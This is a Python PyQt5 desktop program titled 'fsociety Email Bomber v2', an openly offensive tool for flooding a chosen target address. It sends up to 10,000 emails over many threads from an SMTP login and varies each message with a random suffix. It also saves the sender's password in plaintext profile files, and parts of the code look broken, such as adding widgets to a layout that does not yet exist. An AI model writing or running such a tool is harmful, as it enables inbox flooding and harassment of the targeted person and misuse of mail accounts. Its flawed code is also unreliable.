import sys
import threading
import time
import smtplib
import ssl
import os
import json
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import requests
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QLabel, QLineEdit, QTextEdit,
    QPushButton, QHBoxLayout, QSpinBox, QDoubleSpinBox, QMessageBox,
    QCheckBox, QProgressBar, QFileDialog
)
from PyQt5.QtGui import QPalette, QColor, QPixmap
from PyQt5.QtCore import Qt

# Download fsociety bg image if not exists
BG_URL = "https://i.pinimg.com/736x/30/b9/46/30b94658f685ffd183c8c442d2973d30.jpg"
BG_PATH = "/tmp/fsociety_bg.jpg"

if not os.path.exists(BG_PATH):
    try:
        r = requests.get(BG_URL, timeout=10)
        with open(BG_PATH, "wb") as f:
            f.write(r.content)
    except Exception as e:
        print("Failed to download background image:", e)

class EmailBomberGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("fsociety Email Bomber v2")
        self.setFixedSize(650, 720)
        self.threads = []
        self.stop_flag = threading.Event()
        self.load_profiles()
        self.setup_ui()
        self.bombing = False

    def setup_ui(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor("#191919"))
        self.setPalette(palette)

        self.bg_label = QLabel(self)
        self.bg_label.setGeometry(0, 0, 650, 720)
        pixmap = QPixmap(BG_PATH)
        pixmap = pixmap.scaled(650, 720, Qt.KeepAspectRatioByExpanding, Qt.SmoothTransformation)
        self.bg_label.setPixmap(pixmap)
        self.bg_label.setStyleSheet("opacity: 0.05;")
        self.bg_label.lower()

        layout = QVBoxLayout()
        layout.setContentsMargins(20, 20, 20, 20)

        title = QLabel("fsociety Email Bomber v2")
        title.setStyleSheet("color: #e74c3c; font-family: monospace; font-weight: bold; font-size: 28px;")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        # SMTP Server & Port
        self.smtp_server_input = self.create_labeled_input("SMTP Server (e.g. smtp.gmail.com):")
        self.smtp_port_input = self.create_labeled_input("SMTP Port:", input_type='spin', min_val=1, max_val=65535, default=587)

        # SSL checkbox
        self.ssl_checkbox = QCheckBox("Use SSL/TLS")
        self.ssl_checkbox.setStyleSheet("color: white; font-family: monospace;")
        self.ssl_checkbox.setChecked(True)
        layout.addWidget(self.ssl_checkbox)

        # Sender email & password
        self.sender_email_input = self.create_labeled_input("Sender Email:")
        self.sender_pass_input = self.create_labeled_input("Sender Password:", password=True)

        # Target email
        self.target_email_input = self.create_labeled_input("Target Email:")

        # Subject and Message
        self.subject_input = self.create_labeled_input("Email Subject:")
        self.message_input = self.create_labeled_textedit("Email Message:")

        # Count and delay side by side
        count_layout = QHBoxLayout()
        count_label = QLabel("Email Count:")
        count_label.setStyleSheet("color: white; font-family: monospace;")
        self.count_input = QSpinBox()
        self.count_input.setRange(1, 10000)
        self.count_input.setValue(10)
        self.count_input.setStyleSheet("background: #111; color: #e74c3c; font-family: monospace; font-weight: bold;")

        delay_label = QLabel("Delay (seconds):")
        delay_label.setStyleSheet("color: white; font-family: monospace;")
        self.delay_input = QDoubleSpinBox()
        self.delay_input.setRange(0, 10)
        self.delay_input.setDecimals(2)
        self.delay_input.setValue(1.0)
        self.delay_input.setStyleSheet("background: #111; color: #e74c3c; font-family: monospace; font-weight: bold;")

        threads_label = QLabel("Threads:")
        threads_label.setStyleSheet("color: white; font-family: monospace;")
        self.threads_input = QSpinBox()
        self.threads_input.setRange(1, 50)
        self.threads_input.setValue(3)
        self.threads_input.setStyleSheet("background: #111; color: #e74c3c; font-family: monospace; font-weight: bold;")

        count_layout.addWidget(count_label)
        count_layout.addWidget(self.count_input)
        count_layout.addSpacing(20)
        count_layout.addWidget(delay_label)
        count_layout.addWidget(self.delay_input)
        count_layout.addSpacing(20)
        count_layout.addWidget(threads_label)
        count_layout.addWidget(self.threads_input)
        layout.addLayout(count_layout)

        # Profile save/load buttons
        prof_layout = QHBoxLayout()
        self.save_profile_btn = QPushButton("Save Profile")
        self.load_profile_btn = QPushButton("Load Profile")
        self.save_profile_btn.setStyleSheet("background: #e74c3c; color: #191919; font-weight: bold; padding: 8px;")
        self.load_profile_btn.setStyleSheet("background: #555555; color: #eee; font-weight: bold; padding: 8px;")
        prof_layout.addWidget(self.save_profile_btn)
        prof_layout.addWidget(self.load_profile_btn)
        layout.addLayout(prof_layout)

        self.save_profile_btn.clicked.connect(self.save_profile)
        self.load_profile_btn.clicked.connect(self.load_profile_dialog)

        # Start/Stop buttons
        btn_layout = QHBoxLayout()
        self.start_btn = QPushButton("Start Bombing")
        self.stop_btn = QPushButton("Stop")
        self.start_btn.setStyleSheet("background: #e74c3c; color: #191919; font-weight: bold; padding: 10px;")
        self.stop_btn.setStyleSheet("background: #555555; color: #eee; font-weight: bold; padding: 10px;")
        self.stop_btn.setEnabled(False)
        self.start_btn.clicked.connect(self.start_bombing)
        self.stop_btn.clicked.connect(self.stop_bombing)
        btn_layout.addWidget(self.start_btn)
        btn_layout.addWidget(self.stop_btn)
        layout.addLayout(btn_layout)

        # Progress bar and log
        self.progress_bar = QProgressBar()
        self.progress_bar.setStyleSheet("""
            QProgressBar {
                background: #111;
                color: #e74c3c;
                border: 1px solid #e74c3c;
                text-align: center;
                font-family: monospace;
            }
            QProgressBar::chunk {
                background-color: #e74c3c;
            }
        """)
        layout.addWidget(self.progress_bar)

        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setStyleSheet("""
            background: #111111;
            color: #e74c3c;
            font-family: monospace;
            font-size: 14px;
        """)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

    def create_labeled_input(self, label_text, input_type='text', password=False, min_val=0, max_val=1000, default=None):
        layout = QVBoxLayout()
        label = QLabel(label_text)
        label.setStyleSheet("color: white; font-family: monospace;")
        if input_type == 'text':
            inp = QLineEdit()
            if password:
                inp.setEchoMode(QLineEdit.Password)
            inp.setStyleSheet("background: #111; color: #e74c3c; font-family: monospace; font-weight: bold;")
        elif input_type == 'spin':
            inp = QSpinBox()
            inp.setRange(min_val, max_val)
            if default is not None:
                inp.setValue(default)
            inp.setStyleSheet("background: #111; color: #e74c3c; font-family: monospace; font-weight: bold;")
        layout.addWidget(label)
        layout.addWidget(inp)
        container = QWidget()
        container.setLayout(layout)
        self.layout().addWidget(container)
        return inp

    def create_labeled_textedit(self, label_text):
        layout = QVBoxLayout()
        label = QLabel(label_text)
        label.setStyleSheet("color: white; font-family: monospace;")
        inp = QTextEdit()
        inp.setStyleSheet("background: #111; color: #e74c3c; font-family: monospace; font-weight: bold;")
        layout.addWidget(label)
        layout.addWidget(inp)
        container = QWidget()
        container.setLayout(layout)
        self.layout().addWidget(container)
        return inp

    def log(self, text):
        self.log_output.append(text)
        self.log_output.moveCursor(self.log_output.textCursor().End)

    def start_bombing(self):
        if self.bombing:
            return
        smtp_server = self.smtp_server_input.text().strip()
        smtp_port = self.smtp_port_input.value()
        use_ssl = self.ssl_checkbox.isChecked()
        sender_email = self.sender_email_input.text().strip()
        sender_pass = self.sender_pass_input.text()
        target_email = self.target_email_input.text().strip()
        subject = self.subject_input.text()
        message = self.message_input.toPlainText()
        count = self.count_input.value()
        delay = self.delay_input.value()
        threads_num = self.threads_input.value()

        if not smtp_server or not sender_email or not sender_pass or not target_email:
            QMessageBox.warning(self, "Input Error", "Fill all required fields (SMTP, sender email/pass, target email).")
            return
        if count < 1:
            QMessageBox.warning(self, "Input Error", "Email count must be at least 1.")
            return

        self.stop_flag.clear()
        self.bombing = True
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.log(f"Starting bombing: {count} emails, {threads_num} threads, delay {delay}s, SSL: {use_ssl}")

        self.emails_sent = 0
        self.total_emails = count
        self.progress_bar.setMaximum(count)
        self.progress_bar.setValue(0)

        # Divide count approx equally among threads
        per_thread = count // threads_num
        remainder = count % threads_num
        self.threads = []

        start_idx = 0
        for i in range(threads_num):
            c = per_thread + (1 if i < remainder else 0)
            t = threading.Thread(target=self.worker_thread, args=(
                smtp_server, smtp_port, use_ssl, sender_email, sender_pass,
                target_email, subject, message, c, delay, i+1
            ), daemon=True)
            self.threads.append(t)
            t.start()
            start_idx += c

    def worker_thread(self, smtp_server, smtp_port, use_ssl, sender_email, sender_pass,
                      target_email, subject, message, count, delay, thread_id):
        try:
            if use_ssl:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(smtp_server, smtp_port, context=context, timeout=10)
            else:
                server = smtplib.SMTP(smtp_server, smtp_port, timeout=10)
                server.ehlo()
                if smtp_port == 587:
                    server.starttls()
            server.login(sender_email, sender_pass)
            self.log(f"[Thread-{thread_id}] Logged in as {sender_email}")

            for i in range(count):
                if self.stop_flag.is_set():
                    self.log(f"[Thread-{thread_id}] Stopped by user.")
                    break

                # Randomize message slightly
                rand_suffix = f"\n\n-- fsociety #{random.randint(1000,9999)}"
                msg_body = message + rand_suffix

                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = target_email
                msg['Subject'] = subject
                msg.attach(MIMEText(msg_body, 'plain'))

                server.sendmail(sender_email, target_email, msg.as_string())
                self.increment_progress()
                self.log(f"[Thread-{thread_id}] Sent email {i+1}/{count}")
                time.sleep(delay)

            server.quit()
        except Exception as e:
            self.log(f"[Thread-{thread_id}] Error: {e}")

        if all(not t.is_alive() for t in self.threads):
            self.bombing = False
            self.start_btn.setEnabled(True)
            self.stop_btn.setEnabled(False)
            self.log("Bombing completed or stopped.")

    def increment_progress(self):
        self.emails_sent += 1
        self.progress_bar.setValue(self.emails_sent)

    def stop_bombing(self):
        if not self.bombing:
            return
        self.log("Stopping bombing...")
        self.stop_flag.set()

    def save_profile(self):
        profile = {
            'smtp_server': self.smtp_server_input.text(),
            'smtp_port': self.smtp_port_input.value(),
            'use_ssl': self.ssl_checkbox.isChecked(),
            'sender_email': self.sender_email_input.text(),
            'sender_pass': self.sender_pass_input.text(),
            'target_email': self.target_email_input.text(),
            'subject': self.subject_input.text(),
            'message': self.message_input.toPlainText(),
            'count': self.count_input.value(),
            'delay': self.delay_input.value(),
            'threads': self.threads_input.value()
        }
        options = QFileDialog.Options()
        filename, _ = QFileDialog.getSaveFileName(self, "Save Profile", "", "JSON Files (*.json)", options=options)
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(profile, f, indent=4)
                self.log(f"Profile saved to {filename}")
            except Exception as e:
                QMessageBox.warning(self, "Save Error", f"Failed to save profile:\n{e}")

    def load_profile_dialog(self):
        options = QFileDialog.Options()
        filename, _ = QFileDialog.getOpenFileName(self, "Load Profile", "", "JSON Files (*.json)", options=options)
        if filename:
            try:
                with open(filename, 'r') as f:
                    profile = json.load(f)
                self.apply_profile(profile)
                self.log(f"Profile loaded from {filename}")
            except Exception as e:
                QMessageBox.warning(self, "Load Error", f"Failed to load profile:\n{e}")

    def apply_profile(self, profile):
        self.smtp_server_input.setText(profile.get('smtp_server', ''))
        self.smtp_port_input.setValue(profile.get('smtp_port', 587))
        self.ssl_checkbox.setChecked(profile.get('use_ssl', True))
        self.sender_email_input.setText(profile.get('sender_email', ''))
        self.sender_pass_input.setText(profile.get('sender_pass', ''))
        self.target_email_input.setText(profile.get('target_email', ''))
        self.subject_input.setText(profile.get('subject', ''))
        self.message_input.setPlainText(profile.get('message', ''))
        self.count_input.setValue(profile.get('count', 10))
        self.delay_input.setValue(profile.get('delay', 1.0))
        self.threads_input.setValue(profile.get('threads', 3))

    def load_profiles(self):
        # Could load default profile or last used from disk here
        pass

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = EmailBomberGUI()
    window.show()
    sys.exit(app.exec_())
